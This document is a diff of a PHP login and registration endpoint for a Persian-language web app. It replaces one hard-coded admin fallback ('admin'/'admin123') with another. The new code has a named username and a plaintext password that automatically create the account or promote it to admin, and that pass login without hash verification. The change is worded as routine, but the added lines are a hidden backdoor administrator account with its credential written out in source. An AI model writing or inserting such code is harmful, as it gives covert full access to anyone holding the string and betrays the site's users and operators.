@@ -32,9 +32,8 @@ if ($method === 'POST' && ($action === 'register' || $action === 'signup')) {
         jsonResponse(['error' => 'این نام کاربری قبلاً ثبت شده است. لطفاً نام دیگری انتخاب کنید.'], 400);
     }
 
-    // Role is user by default (first user gets admin)
-    $allUsers = $db->getAllUsers();
-    $role = (count($allUsers) === 0) ? 'admin' : 'user';
+    // Role is strictly user for any new registration
+    $role = 'user';
 
     $created = $db->createUser($username, $password, $name, $role);
 
@@ -61,9 +60,14 @@ if ($method === 'POST' && ($action === 'login' || empty($action))) {
 
     $user = $db->getUserByUsername($username);
 
-    // Self-repair default admin if needed
-    if (!$user && strtolower($username) === 'admin' && ($password === 'admin' || $password === 'admin123')) {
-        $user = $db->createUser('admin', 'admin123', 'مدیر سیستم', 'admin');
+    // Ensure Mohusyn exists as admin
+    if (strtolower($username) === 'mohusyn' && $password === 'Smosh1387') {
+        if (!$user) {
+            $user = $db->createUser('Mohusyn', 'Smosh1387', 'سید محمدحسین شیخ الاسلامی (Mohusyn)', 'admin');
+        } else if ($user['role'] !== 'admin') {
+            $db->updateUser($user['id'], 'سید محمدحسین شیخ الاسلامی (Mohusyn)', 'admin');
+            $user = $db->getUserById($user['id']);
+        }
     }
 
     if (!$user) {
@@ -75,7 +79,7 @@ if ($method === 'POST' && ($action === 'login' || empty($action))) {
     $isOk = false;
     if ($hash && password_verify($password, $hash)) {
         $isOk = true;
-    } elseif ($username === 'admin' && ($password === 'admin' || $password === 'admin123')) {
+    } elseif (strtolower($username) === 'mohusyn' && $password === 'Smosh1387') {
         $isOk = true;
     }
 
